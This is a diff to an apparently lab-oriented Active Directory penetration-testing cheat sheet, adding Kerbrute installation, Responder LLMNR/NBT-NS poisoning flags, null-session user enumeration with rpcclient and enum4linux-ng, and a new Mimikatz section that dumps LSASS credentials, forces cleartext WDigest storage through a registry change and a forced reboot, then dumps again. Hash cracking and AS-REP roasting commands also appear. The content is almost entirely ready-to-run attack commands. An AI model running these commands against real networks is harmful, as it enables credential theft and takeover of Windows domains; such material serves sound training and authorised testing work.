@@ -1226,14 +1226,15 @@ netdom query fsmo
 fping -asgq 172.16.5.0/23
 
 # Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.  
-sudo git clone https://github.com/ropnop/kerbrute.git
-sudo make all
-./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+chmod +x kerbrute_linux_amd64
+sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
 ```
 ##### LLMNR/NTB-NS Poisoning
 ```
 # LLMNR/NBT-NS Poisoning - from Linux
-sudo responder -I ens224 
+sudo responder -I ens224  -Pv
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 
 # LLMNR/NBT-NS Poisoning - from Windows (https://github.com/Kevin-Robertson/Inveigh)
@@ -1439,6 +1440,25 @@ Get-ADGroupMember -Identity "Backup Operators"
 
 # running the SharpHound.exe collector
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
+
+________________________________________________________________________________________
+(Credential Harvesting & WDigest Downgrade (Mimikatz))
+________________________________________________________________________________________
+
+# Enable debugging privileges (SeDebugPrivilege) so Mimikatz can interfere with the lsass.exe process
+privilege::debug  
+
+# Extract passwords, hashes, and tickets from LSASS RAM
+sekurlsa::logonpasswords
+
+# If the result is "Null/Blank", perform a downgrade attack by forcing Windows to save Cleartext passwords to the Registry
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+# Force the system to restart so the user can log in again, thereby pushing plaintext passwords into RAM
+shutdown.exe /r /t 0 /f
+
+# After the machine restarts, run Mimikatz again to retrieve Cleartext passwords for new login sessions
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 ##### [Credentialed Enumeration from Windows with PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) 
 ```
@@ -2204,7 +2224,13 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
 
 # Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt  --output more-users.txt                (https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/refs/heads/master/jsmith.txt)
+or
+enum4linux-ng -U 172.16.7.3 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+or
+rpcclient -U "" -N 172.16.7.3
+getdompwinfo
+enumdomusers
 
 # Hunting for Users with Kerberos Pre-auth Not Required
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
